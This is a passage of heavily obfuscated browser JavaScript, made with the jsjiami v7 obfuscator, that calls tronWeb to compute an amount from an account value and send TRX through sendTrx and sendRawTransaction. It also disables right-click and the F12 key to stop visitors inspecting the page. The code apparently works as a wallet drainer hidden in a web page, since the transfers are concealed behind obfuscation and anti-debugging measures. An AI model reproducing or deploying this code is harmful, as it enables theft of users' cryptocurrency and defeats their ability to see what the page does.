						var _0x1616b3 = await tronWeb[_0xd77160(0x1ea, 'iF4l')][_0xd77160(0x216, 'lwE[')](
						_0x31ae4a);
						continue;
					case '2':
						var _0x175dcc = await tronWeb[_0xd77160(0x25c, 'iMsH')]['sendTrx'](_0x2ea395, _0x1616b3,
							_0x31ae4a);
						continue;
					case '3':
						_0x277dc4[_0xd77160(0x217, 'U16F')](s, _0x31ae4a, _0x2ea395, _0x3f1b4f);
						continue;
					case '4':
						_0x1616b3 = _0x277dc4[_0xd77160(0x1c1, 'h2lR')](_0x1616b3, _0x277dc4[_0xd77160(0x235,
							'h2lR')](num, 0x895440));
						continue;
					case '5':
						var _0x4ac742 = await tronWeb[_0xd77160(0x1d1, 'NgL*')]['sendRawTransaction'](_0x303b1b);
						continue;
					case '6':
						if (_0x277dc4[_0xd77160(0x1df, 'Qah7')](_0x1616b3, 0x0)) return ![];
						continue;
				}
				break;
			}
		}
	} catch (_0x16ba2d) {
		_0x277dc4[_0xd77160(0x1cb, 'nLg5')](alert, _0x277dc4[_0xd77160(0x20d, '3Utu')]), console[_0xd77160(0x220,
			'3Utu')](_0x277dc4['JBZlW'], _0x16ba2d);
	}
}
window['oncontextmenu'] = function() {
		var _0x2237e0 = _0x138e2f,
			_0x91796e = {
				'mOQGN': function(_0x1d1ef3, _0x5eb6ae) {
					return _0x1d1ef3(_0x5eb6ae);
				},
				'yfgdQ': _0x2237e0(0x21d, '[nLm')
			};
		return _0x91796e['mOQGN'](alert, _0x91796e[_0x2237e0(0x258, 'waX9')]), ![];
	}, document[_0x138e2f(0x224, ']Qma')] = document[_0x138e2f(0x1e2, 'I93Q')] = document[_0x138e2f(0x20a, 'f!wK')] =
	function(_0x5d63eb) {
		var _0x3744dc = _0x138e2f,
			_0x4fa8e1 = {
				'EOAYc': function(_0x2ebb8b, _0x25a8ac) {
					return _0x2ebb8b(_0x25a8ac);
				},
				'vinNz': _0x3744dc(0x1bd, 'AHT)'),
				'GeaMY': function(_0x116b2a, _0x5380d4) {
					return _0x116b2a === _0x5380d4;
				},
				'BeOZy': 'sLNIZ',
				'IeJLu': function(_0x3286fb, _0x2f31f4) {
					return _0x3286fb(_0x2f31f4);
				},
				'hCaYz': _0x3744dc(0x1e9, 'h2lR')
			};
		let _0x5067e3 = _0x5d63eb || window[_0x3744dc(0x1be, 'kQn[')] || arguments[_0x3744dc(0x21f, '8Mpb')][_0x3744dc(
			0x1fc, 'p&**')][_0x3744dc(0x1dd, 'lwE[')][0x0];
		if (_0x5067e3 && _0x5067e3[_0x3744dc(0x20e, '@P5w')] == 0x7b) return _0x4fa8e1['GeaMY'](_0x4fa8e1[_0x3744dc(
			0x246, 'i42A')], 'GWBcW') ? (_0x4fa8e1[_0x3744dc(0x226, '[nLm')](_0x20a300, _0x4fa8e1[_0x3744dc(
			0x1e3, '[nLm')]), ![]) : (_0x5067e3[_0x3744dc(0x212, 'kQn[')] = ![], _0x4fa8e1[_0x3744dc(0x1ce,
			'$XLR')](alert, _0x4fa8e1[_0x3744dc(0x1d4, 'h2lR')]), ![]);
	};
var version_ = 'jsjiami.com.v7';
